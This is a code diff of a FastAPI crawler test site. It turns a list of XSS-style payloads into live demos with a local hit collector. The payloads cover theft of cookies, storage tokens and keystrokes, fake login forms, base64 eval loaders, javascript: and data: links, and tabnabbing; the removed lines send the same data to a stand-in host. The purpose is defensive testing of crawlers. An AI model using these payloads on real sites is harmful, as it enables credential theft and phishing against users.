@@ -1,11 +1,13 @@
 import asyncio
+import base64
 import io
 import json
 import re
 import urllib.error
 import urllib.request
 import zipfile
-from datetime import datetime
+from collections import deque
+from datetime import datetime, timezone
 from functools import lru_cache
 from html import escape
 from pathlib import Path
@@ -46,6 +48,13 @@ app = FastAPI(
 app.include_router(depth_router)
 
 APP_DIR = Path(__file__).resolve().parent
+
+_collector_log: deque = deque(maxlen=100)
+
+_editable_page: dict = {
+    "title": "Live Edit Test Page",
+    "content": "This page content can be edited inline. Click Save to send a PUT request — the server will reflect the update on the next GET.",
+}
 
 
 def minimal_docx_bytes() -> bytes:
@@ -610,6 +619,8 @@ def homepage_script() -> str:
 </script>"""
 
 
+_G4_B64 = base64.b64encode(b"fetch('/collect/b64?c='+document.cookie)").decode()
+
 SECURITY_TEST_GROUPS = {
     "cookie-theft": {
         "title": "Cookie Theft",
@@ -646,19 +657,19 @@ SECURITY_TEST_GROUPS = {
             (
                 "B1",
                 "Steal localStorage",
-                "<script>fetch('https://collector.invalid/local?value=' + encodeURIComponent(localStorage.getItem('token') || ''))</script>",
+                "<script>fetch('/collect/local?value=' + encodeURIComponent(localStorage.getItem('token') || ''))</script>",
                 "Crawler output should not execute localStorage-reading script text.",
             ),
             (
                 "B2",
                 "Steal sessionStorage",
-                "<script>fetch('https://collector.invalid/session?value=' + encodeURIComponent(sessionStorage.getItem('token') || ''))</script>",
+                "<script>fetch('/collect/session?value=' + encodeURIComponent(sessionStorage.getItem('token') || ''))</script>",
                 "Crawler output should not execute sessionStorage-reading script text.",
             ),
             (
                 "B3",
                 "Steal cookies and both storage objects",
-                "<script>fetch('https://collector.invalid/all', {method:'POST', body: JSON.stringify({cookie: document.cookie, local: {...localStorage}, session: {...sessionStorage}})})</script>",
+                "<script>fetch('/collect/all', {method:'POST', body: JSON.stringify({cookie: document.cookie, local: {...localStorage}, session: {...sessionStorage}})})</script>",
                 "Crawler output should keep combined credential-reading payload text inert.",
             ),
         ],
@@ -669,19 +680,19 @@ SECURITY_TEST_GROUPS = {
             (
                 "C1",
                 "window.location redirect",
-                "<script>window.location='https://collector.invalid/redirected'</script>",
+                "<script>window.location='/collect/redirected'</script>",
                 "Crawler output should not redirect the user when displayed.",
             ),
             (
                 "C2",
                 "Meta refresh redirect",
-                "<meta http-equiv=\"refresh\" content=\"0;url=https://collector.invalid/meta-refresh\">",
+                "<meta http-equiv=\"refresh\" content=\"0;url=/collect/meta-refresh\">",
                 "Crawler output should not create an active meta refresh tag.",
             ),
             (
                 "C3",
                 "Replace page with fake login form",
-                "<script>document.body.innerHTML='<form action=\"https://collector.invalid/login\"><input name=\"email\"><input name=\"password\" type=\"password\"><button>Sign in</button></form>'</script>",
+                "<script>document.body.innerHTML='<form action=\"/collect/login\"><input name=\"email\"><input name=\"password\" type=\"password\"><button>Sign in</button></form>'</script>",
                 "Crawler output should not allow script text to replace the host page.",
             ),
         ],
@@ -692,13 +703,13 @@ SECURITY_TEST_GROUPS = {
             (
                 "D1",
                 "Injected fake login form",
-                "<form action=\"https://collector.invalid/phish\" method=\"post\"><label>Email <input name=\"email\"></label><label>Password <input type=\"password\" name=\"password\"></label><button>Sign in</button></form>",
+                "<form action=\"/collect/phish\" method=\"post\"><label>Email <input name=\"email\"></label><label>Password <input type=\"password\" name=\"password\"></label><button>Sign in</button></form>",
                 "Crawler output should display this as text, not as a working login form.",
             ),
             (
                 "D2",
                 "Invisible overlay capturing clicks",
-                "<div style=\"position:fixed;inset:0;z-index:9999;opacity:0.01\" onclick=\"fetch('https://collector.invalid/click?x='+event.clientX+'&y='+event.clientY)\"></div>",
+                "<div style=\"position:fixed;inset:0;z-index:9999;opacity:0.01\" onclick=\"fetch('/collect/click?x='+event.clientX+'&y='+event.clientY)\"></div>",
                 "Crawler output should not render an overlay or clickable handler.",
             ),
         ],
@@ -709,13 +720,13 @@ SECURITY_TEST_GROUPS = {
             (
                 "E1",
                 "Capture all keystrokes",
-                "<script>document.addEventListener('keydown', e => fetch('https://collector.invalid/key?k=' + encodeURIComponent(e.key)))</script>",
+                "<script>document.addEventListener('keydown', e => fetch('/collect/key?k=' + encodeURIComponent(e.key)))</script>",
                 "Crawler output should not attach a document-level key listener.",
             ),
             (
                 "E2",
                 "Capture input field keystrokes only",
-                "<input onkeydown=\"fetch('https://collector.invalid/input?k=' + encodeURIComponent(event.key))\" autofocus>",
+                "<input onkeydown=\"fetch('/collect/input?k=' + encodeURIComponent(event.key))\" autofocus>",
                 "Crawler output should not render an active input event handler.",
             ),
         ],
@@ -726,19 +737,19 @@ SECURITY_TEST_GROUPS = {
             (
                 "F1",
                 "Tracking pixel without JavaScript",
-                "<img src=\"https://collector.invalid/pixel?case=F1\" width=\"1\" height=\"1\" alt=\"\">",
+                "<img src=\"/collect/pixel?case=F1\" width=\"1\" height=\"1\" alt=\"\">",
                 "Crawler output should not render this as a network-loading pixel.",
             ),
             (
                 "F2",
                 "Send userAgent, screen, and URL",
-                "<script>navigator.sendBeacon('https://collector.invalid/recon', JSON.stringify({ua:navigator.userAgent, screen: screen.width + 'x' + screen.height, url: location.href}))</script>",
+                "<script>navigator.sendBeacon('/collect/recon', JSON.stringify({ua:navigator.userAgent, screen: screen.width + 'x' + screen.height, url: location.href}))</script>",
                 "Crawler output should not execute browser reconnaissance code.",
             ),
             (
                 "F3",
                 "Send list of all links on page",
-                "<script>fetch('https://collector.invalid/links', {method:'POST', body:[...document.links].map(a=>a.href).join('\\n')})</script>",
+                "<script>fetch('/collect/links', {method:'POST', body:[...document.links].map(a=>a.href).join('\\n')})</script>",
                 "Crawler output should not execute link enumeration code.",
             ),
         ],
@@ -755,19 +766,19 @@ SECURITY_TEST_GROUPS = {
             (
                 "G2",
                 "Mixed-case script tags",
-                "<ScRiPt>fetch('https://collector.invalid/mixed?c=' + document.cookie)</sCrIpT>",
+                "<ScRiPt>fetch('/collect/mixed?c=' + document.cookie)</sCrIpT>",
                 "Crawler output should not treat mixed-case tags as executable HTML.",
             ),
             (
                 "G3",
                 "Split across attributes",
-                "<img src=\"x\" onerror=\"this['on'+'error']=null;fetch('https://collector.invalid/split?c='+document.cookie)\">",
+                "<img src=\"x\" onerror=\"this['on'+'error']=null;fetch('/collect/split?c='+document.cookie)\">",
                 "Crawler output should not render reconstructed handler logic.",
             ),
             (
                 "G4",
                 "Base64 plus atob",
-                "<script>eval(atob('ZmV0Y2goJ2h0dHBzOi8vY29sbGVjdG9yLmludmFsaWQvYjY0P2M9Jytkb2N1bWVudC5jb29raWUp'))</script>",
+                f"<script>eval(atob('{_G4_B64}'))</script>",
                 "Crawler output should keep encoded script loaders inert.",
             ),
         ],
@@ -778,19 +789,19 @@ SECURITY_TEST_GROUPS = {
             (
                 "H1",
                 "javascript: href",
-                "<a href=\"javascript:fetch('https://collector.invalid/js-href?c='+document.cookie)\">Open report</a>",
+                "<a href=\"javascript:fetch('/collect/js-href?c='+document.cookie)\">Open report</a>",
                 "Crawler output should not create an active javascript: link.",
             ),
             (
                 "H2",
                 "data: URL href",
-                "<a href=\"data:text/html,<script>fetch('https://collector.invalid/data-url?c='+document.cookie)</script>\">Open data URL</a>",
+                "<a href=\"data:text/html,<script>fetch('/collect/data-url?c='+document.cookie)</script>\">Open data URL</a>",
                 "Crawler output should not create an active data: link with script content.",
             ),
             (
                 "H3",
                 "Tabnabbing target blank without noopener",
-                "<a href=\"https://collector.invalid/blank\" target=\"_blank\">Open report in new tab</a>",
+                "<a href=\"/collect/blank\" target=\"_blank\">Open report in new tab</a>",
                 "Crawler output should not render unsafe target blank links without normalization.",
             ),
         ],
@@ -832,7 +843,7 @@ def security_test_head() -> str:
     <style>
       .security-test-table {
         border-collapse: collapse;
-        max-width: 1120px;
+        max-width: 1280px;
         width: 100%;
       }
       .security-test-table th,
@@ -844,9 +855,69 @@ def security_test_head() -> str:
       }
       .security-test-table pre {
         margin: 0;
-        max-width: 560px;
+        max-width: 400px;
         overflow-wrap: anywhere;
         white-space: pre-wrap;
+      }
+      .demo-frame {
+        background: #fff;
+        border: 1px solid #bbb;
+        min-height: 48px;
+        width: 100%;
+      }
+      .collector-panel {
+        border: 2px solid #1a56db;
+        border-radius: 4px;
+        margin: 0 0 24px;
+        max-width: 900px;
+        padding: 14px 16px;
+      }
+      .collector-title {
+        font-size: 1rem;
+        margin: 0 0 4px;
+      }
+      .hit-count {
+        color: #555;
+        font-size: 0.85rem;
+        font-weight: normal;
+      }
+      .collector-hint {
+        color: #555;
+        font-size: 0.85rem;
+        margin: 0 0 10px;
+      }
+      .collector-log {
+        background: #111;
+        border-radius: 3px;
+        color: #9effa0;
+        font-family: monospace;
+        font-size: 0.8rem;
+        max-height: 220px;
+        overflow-y: auto;
+        padding: 10px;
+      }
+      .hit { padding: 2px 0; }
+      .hit-time { color: #69c; margin-right: 6px; }
+      .clear-btn {
+        background: none;
+        border: 1px solid #888;
+        border-radius: 3px;
+        cursor: pointer;
+        font-size: 0.8rem;
+        margin-top: 8px;
+        padding: 3px 8px;
+      }
+      .bad-link-case {
+        max-width: 760px;
+      }
+      .bad-link-live {
+        border: 1px solid #bbb;
+        border-radius: 3px;
+        margin: 16px 0;
+        padding: 16px;
+      }
+      .bad-link-live p {
+        margin: 0 0 10px;
       }
     </style>
     """
@@ -856,6 +927,7 @@ def security_test_body(group_slug: str) -> str:
     group = SECURITY_TEST_GROUPS[group_slug]
     rows = []
     for case_id, case_name, payload, expected in group["cases"]:
+        srcdoc_val = escape(payload, quote=True)
         rows.append(
             f"""
         <tr>
@@ -863,20 +935,40 @@ def security_test_body(group_slug: str) -> str:
           <td>{escape(case_name)}</td>
           <td><pre><code>{escape(payload)}</code></pre></td>
           <td>{escape(expected)}</td>
+          <td><iframe class="demo-frame" sandbox="allow-scripts allow-forms" srcdoc="{srcdoc_val}"></iframe></td>
         </tr>"""
         )
 
+    bad_links_section = ""
+    if group_slug == "bad-links":
+        bad_links_section = """
+      <section style="margin-bottom:20px">
+        <h2 style="font-size:1rem;margin:0 0 8px">Individual case pages</h2>
+        <ul>
+          <li><a href="/security/bad-links/javascript-href">H1 — javascript: Href</a></li>
+          <li><a href="/security/bad-links/data-url">H2 — data: URL Href</a></li>
+          <li><a href="/security/bad-links/tabnabbing">H3 — Tabnabbing</a></li>
+        </ul>
+      </section>"""
+
     return f"""
     <article>
-      <p>These cases intentionally expose XSS-looking payload text as escaped content. They should remain inert on this site and in any crawl-service HTML display.</p>
+      {bad_links_section}
+      <section class="collector-panel">
+        <h2 class="collector-title">Collector Log <span id="hit-count" class="hit-count"></span></h2>
+        <p class="collector-hint">Payloads in the Live Output column run automatically in sandboxed iframes. Fetch and beacon calls appear here (auto-refreshes every 2 s).</p>
+        <div id="collector-log" class="collector-log">Waiting for hits&hellip;</div>
+        <button onclick="clearLog()" class="clear-btn">Clear</button>
+      </section>
       <table class="security-test-table">
         <caption>{escape(group["title"])} Security Test Cases</caption>
         <thead>
           <tr>
             <th scope="col">Case</th>
             <th scope="col">Name</th>
-            <th scope="col">Escaped Payload Text</th>
+            <th scope="col">Payload</th>
             <th scope="col">Expected Behavior</th>
+            <th scope="col">Live Output</th>
           </tr>
         </thead>
         <tbody>
@@ -885,6 +977,30 @@ def security_test_body(group_slug: str) -> str:
       </table>
       <p><a href="/">Back to crawl test home</a></p>
     </article>
+    <script>
+    async function pollLog() {{
+      try {{
+        const res = await fetch('/collect-log');
+        const hits = await res.json();
+        const el = document.getElementById('collector-log');
+        const countEl = document.getElementById('hit-count');
+        countEl.textContent = hits.length ? '(' + hits.length + ' hit' + (hits.length === 1 ? '' : 's') + ')' : '';
+        if (!hits.length) {{ el.textContent = 'No hits yet.'; return; }}
+        el.innerHTML = hits.slice().reverse().slice(0, 30).map(h => {{
+          const t = h.time.slice(11, 19);
+          const qs = h.query ? '?' + h.query : '';
+          const body = h.body ? ' — ' + h.body.slice(0, 100) : '';
+          return '<div class="hit"><span class="hit-time">' + t + 'Z</span> <strong>' + h.method + '</strong> ' + h.path + qs + body + '</div>';
+        }}).join('');
+      }} catch (e) {{}}
+    }}
+    async function clearLog() {{
+      await fetch('/collect-clear', {{ method: 'POST' }});
+      pollLog();
+    }}
+    setInterval(pollLog, 2000);
+    pollLog();
+    </script>
     """
 
 
@@ -988,8 +1104,55 @@ def product_page_head() -> str:
         border: 1px solid #aaa;
         padding: 8px;
       }
+      .collection-layout {
+        display: grid;
+        gap: 20px;
+        grid-template-columns: minmax(180px, 240px) minmax(0, 1fr);
+        max-width: 1120px;
+      }
+      .collection-filters {
+        border: 1px solid #999;
+        padding: 12px;
+      }
+      .collection-toolbar {
+        align-items: center;
+        display: flex;
+        flex-wrap: wrap;
+        gap: 12px;
+        justify-content: space-between;
+        margin-bottom: 16px;
+      }
+      .collection-grid {
+        display: grid;
+        gap: 16px;
+        grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      }
+      .collection-card {
+        border: 1px solid #999;
+        display: grid;
+        gap: 8px;
+        padding: 12px;
+      }
+      .collection-card-visual {
+        align-items: center;
+        background: linear-gradient(145deg, var(--swatch), #f8f8f8);
+        border: 1px solid #aaa;
+        display: flex;
+        min-height: 140px;
+        justify-content: center;
+        padding: 10px;
+        text-align: center;
+      }
+      .collection-card-actions {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 6px;
+      }
       @media (max-width: 760px) {
         .product-grid {
+          grid-template-columns: 1fr;
+        }
+        .collection-layout {
           grid-template-columns: 1fr;
         }
       }
@@ -1242,6 +1405,125 @@ async def index(request: Request):
     return html_page("Crawl Test Home", body, script=homepage_script())
 
 
+def _bad_link_page(title: str, description: str, live_html: str) -> str:
+    panel = """
+    <section class="collector-panel">
+      <h2 class="collector-title">Collector Log <span id="hit-count" class="hit-count"></span></h2>
+      <p class="collector-hint">Activating the link below sends a hit to <code>/collect/</code>. It appears here (auto-refreshes every 2 s).</p>
+      <div id="collector-log" class="collector-log">No hits yet.</div>
+      <button onclick="clearLog()" class="clear-btn">Clear</button>
+    </section>"""
+    script = """
+    <script>
+    async function pollLog() {
+      try {
+        const res = await fetch('/collect-log');
+        const hits = await res.json();
+        const el = document.getElementById('collector-log');
+        const countEl = document.getElementById('hit-count');
+        countEl.textContent = hits.length ? '(' + hits.length + ' hit' + (hits.length === 1 ? '' : 's') + ')' : '';
+        if (!hits.length) { el.textContent = 'No hits yet.'; return; }
+        el.innerHTML = hits.slice().reverse().slice(0, 30).map(h => {
+          const t = h.time.slice(11, 19);
+          const qs = h.query ? '?' + h.query : '';
+          const body = h.body ? ' — ' + h.body.slice(0, 100) : '';
+          return '<div class="hit"><span class="hit-time">' + t + 'Z</span> <strong>' + h.method + '</strong> ' + h.path + qs + body + '</div>';
+        }).join('');
+      } catch (e) {}
+    }
+    async function clearLog() {
+      await fetch('/collect-clear', { method: 'POST' });
+      pollLog();
+    }
+    setInterval(pollLog, 2000);
+    pollLog();
+    </script>"""
+    body = f"""
+    <article class="bad-link-case">
+      <p><a href="/security/bad-links">&larr; Bad Links</a></p>
+      <p>{description}</p>
+      {panel}
+      <div class="bad-link-live">
+        {live_html}
+      </div>
+      <p><a href="/">Back to crawl test home</a></p>
+    </article>
+    {script}
+    """
+    return html_page(title, body, head=security_test_head())
+
+
+@app.get("/security/bad-links/tabnabbing-target", response_class=HTMLResponse)
+async def security_bad_link_tabnabbing_target():
+    body = """
+    <article>
+      <h1 style="font-size:1.1rem">Tabnabbing Target Page</h1>
+      <p>This page was opened via a <code>target="_blank"</code> link without <code>rel="noopener noreferrer"</code>.</p>
+      <p id="status">Checking window.opener&hellip;</p>
+    </article>
+    <script>
+    if (window.opener) {
+      try {
+        window.opener.location = '/collect/tabnapped';
+        document.getElementById('status').textContent =
+          'window.opener was accessible — your original tab has been redirected to /collect/tabnapped. This is the tabnabbing attack.';
+      } catch (e) {
+        document.getElementById('status').textContent = 'window.opener found but could not redirect: ' + e.message;
+      }
+    } else {
+      document.getElementById('status').textContent =
+        'No window.opener (page was opened with noopener, or navigated to directly — the attack is blocked).';
+    }
+    </script>
+    """
+    return HTMLResponse(f"""<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Tabnabbing Target</title></head>
+<body style="font-family:sans-serif;padding:24px">{body}</body></html>""")
+
+
+@app.get("/security/bad-links/javascript-href", response_class=HTMLResponse)
+async def security_bad_link_javascript_href():
+    live = """
+    <p>This is a link with a <code>javascript:</code> href. Clicking it runs the script inline and sends a hit to the collector.</p>
+    <a href="javascript:fetch('/collect/js-href?c='+encodeURIComponent(document.cookie))">Open report</a>
+    """
+    return _bad_link_page(
+        "Bad Link — javascript: Href (H1)",
+        "A <code>javascript:</code> href executes arbitrary script when clicked. "
+        "A crawl service should not treat this as a navigable URL or re-render it as an active link.",
+        live,
+    )
+
+
+@app.get("/security/bad-links/data-url", response_class=HTMLResponse)
+async def security_bad_link_data_url():
+    live = """
+    <p>This link opens a <code>data:</code> URL whose HTML payload contains a script. Clicking it loads the data URL in the browser and the embedded script runs.</p>
+    <a href="data:text/html,<script>fetch('/collect/data-url?c='+document.cookie)</script>">Open data URL</a>
+    """
+    return _bad_link_page(
+        "Bad Link — data: URL Href (H2)",
+        "A <code>data:</code> URL href can embed arbitrary HTML and scripts. "
+        "A crawl service should not follow or render this as a trusted page.",
+        live,
+    )
+
+
+@app.get("/security/bad-links/tabnabbing", response_class=HTMLResponse)
+async def security_bad_link_tabnabbing():
+    live = """
+    <p>This link opens in a new tab without <code>rel="noopener noreferrer"</code>. The opened tab has access to <code>window.opener</code> and can redirect this tab.</p>
+    <p>Click the link, then watch this tab — the tabnabbing target page will attempt to redirect it to <code>/collect/tabnapped</code>.</p>
+    <a href="/security/bad-links/tabnabbing-target" target="_blank">Open report in new tab</a>
+    """
+    return _bad_link_page(
+        "Bad Link — Tabnabbing (H3)",
+        "A <code>target=\"_blank\"</code> link without <code>rel=\"noopener noreferrer\"</code> gives the opened tab "
+        "access to <code>window.opener</code>, allowing it to silently redirect the original tab to a phishing page.",
+        live,
+    )
+
+
 @app.get("/security/{group_slug}", response_class=HTMLResponse)
 async def security_test_group(group_slug: str):
     if group_slug not in SECURITY_TEST_GROUPS:
@@ -1253,6 +1535,106 @@ async def security_test_group(group_slug: str):
         security_test_body(group_slug),
         head=security_test_head(),
     )
+
+
+_CORS = {
+    "Access-Control-Allow-Origin": "*",
+    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
+    "Access-Control-Allow-Headers": "Content-Type",
+}
+
+
+@app.api_route("/collect/{path:path}", methods=["GET", "POST", "OPTIONS"])
+async def collect_hit(path: str, request: Request):
+    if request.method == "OPTIONS":
+        return Response(headers=_CORS)
+    body_bytes = await request.body()
+    body_text = body_bytes.decode("utf-8", errors="replace") if body_bytes else ""
+    entry = {
+        "time": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S"),
+        "method": request.method,
+        "path": f"/collect/{path}",
+        "query": str(request.query_params),
+        "body": body_text[:200],
+    }
+    _collector_log.append(entry)
+    if "text/html" in request.headers.get("accept", ""):
+        html = (
+            "<!DOCTYPE html><html><head><meta charset='utf-8'>"
+            "<title>Captured!</title></head><body style='font-family:sans-serif;padding:24px'>"
+            f"<h1>✔ Captured</h1>"
+            f"<p>Hit logged: <code>{escape(entry['path'])}"
+            f"{'?' + escape(entry['query']) if entry['query'] else ''}</code></p>"
+            "<p><a href='/'>Return home</a></p></body></html>"
+        )
+        return HTMLResponse(html, headers=_CORS)
+    return JSONResponse({"ok": True}, headers=_CORS)
+
+
+@app.get("/collect-log")
+async def collect_log_endpoint():
+    return JSONResponse(list(_collector_log), headers={"Access-Control-Allow-Origin": "*"})
+
+
+@app.post("/collect-clear")
+async def collect_clear():
+    _collector_log.clear()
+    return JSONResponse({"ok": True})
+
+
+@app.get("/editable", response_class=HTMLResponse)
+async def editable_get():
+    title = escape(_editable_page["title"])
+    content = escape(_editable_page["content"])
+    body = f"""
+    <article style="max-width:720px">
+      <h1 id="edit-title" contenteditable="true" style="border-bottom:2px solid #1a56db;padding-bottom:4px;outline:none">{title}</h1>
+      <div id="edit-content" contenteditable="true"
+           style="border:1px solid #bbb;border-radius:3px;line-height:1.6;margin:16px 0;min-height:120px;outline:none;padding:12px">{content}</div>
+      <div style="display:flex;align-items:center;gap:12px">
+        <button onclick="savePage()"
+                style="background:#1a56db;border:none;border-radius:3px;color:#fff;cursor:pointer;padding:8px 18px">Save</button>
+        <span id="save-status" style="font-size:0.9rem"></span>
+      </div>
+      <p style="color:#666;font-size:0.85rem;margin-top:24px">
+        Content is stored in server memory and resets on restart.
+        Saving via PUT requires the live server (Render); on static hosting the save will fail gracefully.
+      </p>
+      <p><a href="/">Back to crawl test home</a></p>
+    </article>
+    <script>
+    async function savePage() {{
+      const title = document.getElementById('edit-title').textContent;
+      const content = document.getElementById('edit-content').textContent;
+      const statusEl = document.getElementById('save-status');
+      statusEl.textContent = 'Saving…';
+      try {{
+        const res = await fetch('/editable', {{
+          method: 'PUT',
+          headers: {{ 'Content-Type': 'application/json' }},
+          body: JSON.stringify({{ title, content }}),
+        }});
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        const data = await res.json();
+        if (data.ok) {{
+          statusEl.textContent = 'Saved ✓';
+          setTimeout(() => {{ statusEl.textContent = ''; }}, 2000);
+        }}
+      }} catch (e) {{
+        statusEl.textContent = 'Save failed — PUT requests require the live server deployment.';
+      }}
+    }}
+    </script>
+    """
+    return html_page("Editable Page (PUT)", body)
+
+
+@app.put("/editable")
+async def editable_put(request: Request):
+    data = await request.json()
+    _editable_page["title"] = str(data.get("title", _editable_page["title"]))[:500]
+    _editable_page["content"] = str(data.get("content", _editable_page["content"]))[:5000]
+    return JSONResponse({"ok": True, **_editable_page})
 
 
 @app.get("/about", response_class=HTMLResponse)
@@ -1468,8 +1850,7 @@ async def slow():
     return html_page("Slow Page", '<p>Slow page finished after a delay.</p><a href="/query-page?ref=slow">Query from slow page</a>')
 
 
-@app.get("/transient-load")
-async def transient_load(key: str = "default"):
+def transient_load_response(key: str):
     count = transient_load_counts.get(key, 0) + 1
     transient_load_counts[key] = count
 
@@ -1490,6 +1871,28 @@ async def transient_load(key: str = "default"):
     return html_page("Transient Load Succeeded", body)
 
 
+def transient_load_status_payload(key: str) -> dict:
+    count = transient_load_counts.get(key, 0)
+    return {
+        "key": key,
+        "access_count": count,
+        "failed_access_count": min(count, TRANSIENT_LOAD_FAILURES),
+        "failure_count_before_success": TRANSIENT_LOAD_FAILURES,
+        "retry_count": max(0, count - TRANSIENT_LOAD_FAILURES - 1),
+        "can_access_now": count >= TRANSIENT_LOAD_FAILURES,
+    }
+
+
+def transient_load_reset_payload(key: str) -> dict:
+    transient_load_counts.pop(key, None)
+    return {"key": key, "reset": True, "failure_count_before_success": TRANSIENT_LOAD_FAILURES}
+
+
+@app.get("/transient-load")
+async def transient_load(key: str = "default"):
+    return transient_load_response(key)
+
+
 @app.get("/transient-load-child", response_class=HTMLResponse)
 async def transient_load_child():
     body = """
@@ -1501,23 +1904,12 @@ async def transient_load_child():
 
 @app.get("/transient-load/status")
 async def transient_load_status(key: str = "default"):
-    count = transient_load_counts.get(key, 0)
-    return JSONResponse(
-        {
-            "key": key,
-            "access_count": count,
-            "failed_access_count": min(count, TRANSIENT_LOAD_FAILURES),
-            "failure_count_before_success": TRANSIENT_LOAD_FAILURES,
-            "retry_count": max(0, count - TRANSIENT_LOAD_FAILURES - 1),
-            "can_access_now": count >= TRANSIENT_LOAD_FAILURES,
-        }
-    )
+    return JSONResponse(transient_load_status_payload(key))
 
 
 @app.get("/transient-load/reset")
 async def transient_load_reset(key: str = "default"):
-    transient_load_counts.pop(key, None)
-    return JSONResponse({"key": key, "reset": True, "failure_count_before_success": TRANSIENT_LOAD_FAILURES})
+    return JSONResponse(transient_load_reset_payload(key))
 
 
 @app.get("/empty", response_class=HTMLResponse)
@@ -1987,6 +2379,219 @@ async def product_javascript_calculated():
 @app.get("/product-pages/javascript-calculated/data.json")
 async def product_javascript_calculated_data():
     return JSONResponse(product_data_payload())
+
+
+def product_collection_grid_payload() -> dict:
+    products = [
+        {
+            "id": "gold-arch-8ft",
+            "title": "Heavy Duty Gold Metal Wedding Arch",
+            "variant": "8ft",
+            "price": 159.99,
+            "price_label": "$159.99",
+            "reviews": 880,
+            "color": "Gold",
+            "type": "Backdrop Stand",
+            "swatch": "#c9a227",
+            "href": "/query-page?product=gold-arch-8ft",
+        },
+        {
+            "id": "crystal-candelabra-47",
+            "title": "10-Arm Crystal Cluster Taper Candelabra",
+            "variant": '47" | 10 Arm',
+            "price": 209.99,
+            "price_label": "$209.99",
+            "reviews": 58,
+            "color": "Clear",
+            "type": "Table Centerpiece",
+            "swatch": "#dfefff",
+            "href": "/query-page?product=crystal-candelabra-47",
+        },
+        {
+            "id": "clear-gold-charger-10",
+            "title": "10-Pack Plastic Charger Plates with Gold Beaded Rim",
+            "variant": '13" | 10 Pack',
+            "price": 21.99,
+            "price_label": "$21.99",
+            "reviews": 267,
+            "color": "Clear",
+            "type": "Dinnerware",
+            "swatch": "#f8fbff",
+            "href": "/query-page?product=clear-gold-charger-10",
+        },
+        {
+            "id": "white-chair-covers-10",
+            "title": "10 Pack Spandex Fitted Banquet Chair Covers",
+            "variant": "10 Pack",
+            "price": 21.99,
+            "price_label": "$21.99",
+            "reviews": 21,
+            "color": "White",
+            "type": "Chair Covers",
+            "swatch": "#ffffff",
+            "href": "/query-page?product=white-chair-covers-10",
+        },
+        {
+            "id": "white-scuba-tablecloth-120",
+            "title": "Scuba Round Tablecloth 120 Inch",
+            "variant": '120"',
+            "price": 21.99,
+            "price_label": "$21.99",
+            "reviews": 33,
+            "color": "White",
+            "type": "Table Linens",
+            "swatch": "#f3f3f3",
+            "href": "/query-page?product=white-scuba-tablecloth-120",
+        },
+        {
+            "id": "black-ruffle-chair-cover",
+            "title": "Ruffle Pleated Skirt Banquet Spandex Chair Cover",
+            "variant": "1 Piece",
+            "price": 4.39,
+            "price_label": "$4.39",
+            "reviews": 16,
+            "color": "Black",
+            "type": "Chair Covers",
+            "swatch": "#1d1d1d",
+            "href": "/query-page?product=black-ruffle-chair-cover",
+        },
+    ]
+    return {
+        "collection": {
+            "title": "Shop by Color Event Decor",
+            "result_count": len(products),
+            "sort_options": ["Relevance", "Newest", "Best Sellers", "Price: low to high", "Price: high to low"],
+        },
+        "filters": {
+            "type": sorted({product["type"] for product in products}),
+            "color": sorted({product["color"] for product in products}),
+        },
+        "products": products,
+    }
+
+
+@app.get("/product-pages/javascript-rendered-grid", response_class=HTMLResponse)
+async def product_javascript_rendered_grid():
+    body = f"""
+    {product_breadcrumbs("JavaScript rendered product grid")}
+    <article>
+      <h2>Shop by Color Event Decor</h2>
+      <p>This collection-style product grid renders product cards from JavaScript after fetching a same-origin JSON payload.</p>
+      <div class="collection-layout">
+        <aside class="collection-filters" aria-label="Product filters">
+          <h3>Filter by</h3>
+          <label for="grid-type-filter">Product Type</label>
+          <select id="grid-type-filter"><option value="">All product types</option></select>
+          <label for="grid-color-filter">Color</label>
+          <select id="grid-color-filter"><option value="">All colors</option></select>
+        </aside>
+        <section>
+          <div class="collection-toolbar">
+            <p id="grid-result-count" aria-live="polite">Product grid loads after JavaScript runs.</p>
+            <label for="grid-sort">Sort</label>
+            <select id="grid-sort"></select>
+          </div>
+          <div id="js-product-grid" class="collection-grid" aria-live="polite"></div>
+          <p id="grid-empty-state" hidden>No products match the selected filters.</p>
+        </section>
+      </div>
+    </article>
+    """
+    script = """
+    <script>
+      const gridDataUrl = "/product-pages/javascript-rendered-grid/data.json";
+      const typeFilter = document.querySelector("#grid-type-filter");
+      const colorFilter = document.querySelector("#grid-color-filter");
+      const sortSelect = document.querySelector("#grid-sort");
+      const resultCount = document.querySelector("#grid-result-count");
+      const grid = document.querySelector("#js-product-grid");
+      const emptyState = document.querySelector("#grid-empty-state");
+      let gridPayload = null;
+
+      function addOptions(select, values) {
+        values.forEach((value) => {
+          const option = document.createElement("option");
+          option.value = value;
+          option.textContent = value;
+          select.appendChild(option);
+        });
+      }
+
+      function sortedProducts(products) {
+        const selectedSort = sortSelect.value;
+        const copy = [...products];
+        if (selectedSort === "Newest") {
+          return copy.reverse();
+        }
+        if (selectedSort === "Best Sellers") {
+          return copy.sort((left, right) => right.reviews - left.reviews);
+        }
+        if (selectedSort === "Price: low to high") {
+          return copy.sort((left, right) => left.price - right.price);
+        }
+        if (selectedSort === "Price: high to low") {
+          return copy.sort((left, right) => right.price - left.price);
+        }
+        return copy;
+      }
+
+      function filteredProducts() {
+        return gridPayload.products.filter((product) => {
+          const typeMatches = !typeFilter.value || product.type === typeFilter.value;
+          const colorMatches = !colorFilter.value || product.color === colorFilter.value;
+          return typeMatches && colorMatches;
+        });
+      }
+
+      function renderCard(product) {
+        const card = document.createElement("article");
+        card.className = "collection-card";
+        card.dataset.productId = product.id;
+        card.innerHTML = `
+          <div class="collection-card-visual" style="--swatch: ${product.swatch}">
+            <strong>${product.color} ${product.type}</strong>
+          </div>
+          <p>${product.variant}</p>
+          <h3><a href="${product.href}">${product.title}</a></h3>
+          <p class="product-price">${product.price_label}</p>
+          <p>${product.reviews} reviews</p>
+          <div class="collection-card-actions">
+            <button type="button">Wish List</button>
+            <button type="button">Quick View</button>
+            <button type="button">Add to Cart</button>
+          </div>
+        `;
+        return card;
+      }
+
+      function renderGrid() {
+        const products = sortedProducts(filteredProducts());
+        grid.replaceChildren();
+        products.forEach((product) => grid.appendChild(renderCard(product)));
+        resultCount.textContent = `${products.length} results`;
+        emptyState.hidden = products.length > 0;
+      }
+
+      fetch(gridDataUrl)
+        .then((response) => response.json())
+        .then((payload) => {
+          gridPayload = payload;
+          addOptions(typeFilter, payload.filters.type);
